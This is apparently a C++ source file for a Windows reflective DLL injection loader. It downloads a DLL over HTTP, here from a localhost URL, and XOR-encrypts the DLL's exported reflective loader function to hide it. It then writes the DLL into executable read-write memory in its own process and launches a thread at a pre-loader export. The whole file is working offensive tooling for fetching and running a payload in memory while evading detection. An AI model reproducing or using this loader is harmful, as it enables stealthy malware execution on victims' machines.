#include "framework.h"
#include "args.h"
#include "download.h"
#include "dll.h"
#include <vector>
#include <iostream>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

static constexpr auto EXPORTED_DLL_FUNC_NAME = "ReflectiveFunction";
static constexpr auto EXPORTED_DLL_PRE_LOADER = "_123321_asdf21425";


const byte_t HEADER[] = {0x41, 0x42, 0x43, 0x44};
const size_t HEADER_SIZE = 4 * sizeof(byte_t);
const size_t FUNC_SIZE = sizeof(size_t);
static size_t DLL_HEADER_SIZE = HEADER_SIZE + Key::OB_XOR_KEY_SIZE + FUNC_SIZE;

//static byte_t* add_header_to_dll(byte_t* dll_buf, size_t dll_size, size_t func_size)
//{
//
//	byte_t* new_dll_buf = new byte_t[dll_size + DLL_HEADER_SIZE];
//
//	memmove(new_dll_buf + DLL_HEADER_SIZE, dll_buf, dll_size);
//
//	memcpy(new_dll_buf, HEADER, HEADER_SIZE);
//	memcpy(new_dll_buf + HEADER_SIZE, Key::OB_XOR_KEY, Key::OB_XOR_KEY_SIZE);
//	memcpy(new_dll_buf + HEADER_SIZE + Key::OB_XOR_KEY_SIZE, &func_size, FUNC_SIZE);
//
//	return new_dll_buf;
//
//}

static byte_t* inject_dll_to_loc_proc(byte_t* dll_buf, size_t dll_size, size_t func_size) 
{
	//byte_t* new_dll_buf = add_header_to_dll(dll_buf, dll_size, func_size);

	byte_t* dll_dst = (byte_t*)VirtualAlloc(
		NULL, 
		dll_size + DLL_HEADER_SIZE, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);

	memcpy(dll_dst + DLL_HEADER_SIZE, dll_buf, dll_size);
	memcpy(dll_dst, HEADER, HEADER_SIZE);
	memcpy(dll_dst + HEADER_SIZE, Key::OB_XOR_KEY, Key::OB_XOR_KEY_SIZE);
	memcpy(dll_dst + HEADER_SIZE + Key::OB_XOR_KEY_SIZE, &func_size, FUNC_SIZE);

	if (dll_dst == NULL)
	{
		std::cout << "[-] Error while allocating memory in local process, exiting ... " << std::endl;
		return NULL;
	}

	//memcpy(dll_dst, new_dll_buf, dll_size + DLL_HEADER_SIZE);

	return dll_dst;
}

int main(int argc, char* argv[]) {

	i_arg_t arguments = argument_parser(argc, argv);

	const char* url = "http://127.0.0.1/ReflectiveDLL.dll";
	std::vector<char> pefile = download_from_url(url);

	PBYTE pebase = (PBYTE)(pefile.data());

	if (pefile.size() == 0) {
		std::cerr << "[-] Error while downloading file\n";
		return 1;
	}

	DLLParser pe;
	if (!pe.initialize((char*)pebase, pefile.size()))
	{
		std::cerr << "[-] Cannot parse the DLL\n";
	}

	if (arguments.is_local) {
		//print the PID of the current process
		DWORD pid = GetCurrentProcessId();
		printf("[+] Current process PID: %lu\n", pid);

		void* reflective_loader_func = pe.retrieve_func_raw_ptr(EXPORTED_DLL_FUNC_NAME);
		if (reflective_loader_func == NULL) {
			std::cout << "[-] Error while retrieving the RAW offset of the ReflectiveLoader function\n";
			return -1;
		}

		printf("[+] ReflectiveLoader function found at relative raw address: %p\n", reflective_loader_func);

		/* Finding function size for encryption */
		byte_t* reflective_loader_func_end = pe.find_func_end((byte_t*)reflective_loader_func);

		size_t rf_loader_size = (size_t)(reflective_loader_func_end - (byte_t*)reflective_loader_func);
		printf("[+] Size of Reflective Function (bytes): %lld\n", rf_loader_size);

		
		/* Hiding the reflective function */
		encrypt_data(pe.get_base() + (dword_t)(reflective_loader_func), (size_t)rf_loader_size);


		/* Allocate memory, write dll to local process. */
		byte_t* local_pe_base = inject_dll_to_loc_proc(pe.get_base(), pe.get_size(), rf_loader_size);

		if (local_pe_base == NULL) 
		{
			std::cout << "[-] Error while injecting the DLL in the local process, exiting\n";
			return 1;
		}

		printf("[+] Successfully injected the DLL in the local process at address : % p\n", local_pe_base);

		void* reflective_pre_loader_func = pe.retrieve_func_raw_ptr(EXPORTED_DLL_PRE_LOADER);
		if (reflective_pre_loader_func == NULL) {
			std::cout << "[-] Error while retrieving the RAW offset of the PreLoader function\n";
			return 1;
		}
		printf("[+] PreLoader function found at relative raw address: %p\n", reflective_pre_loader_func);


		/* Create local thread to run the function. */
		DWORD thread_id = 0x0;
		HANDLE hThread = NULL;

		hThread = CreateThread(
			NULL, 0,
			(LPTHREAD_START_ROUTINE)(local_pe_base + (DWORD)reflective_pre_loader_func + DLL_HEADER_SIZE),
			NULL, 0, &thread_id
		);

		if (hThread == NULL) {
			std::cout << "[-] Error while running the local thread, exiting ... \n";
		}
		else {
			printf("[+] Successufully ran thread with id: %lu\n", thread_id);
		}
		
		//injection successful, waiting for user input to close the program
		printf("[!] Input char to end the program\n");
		getchar();
		//WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);

		return 0;
	}

	return 0;

}
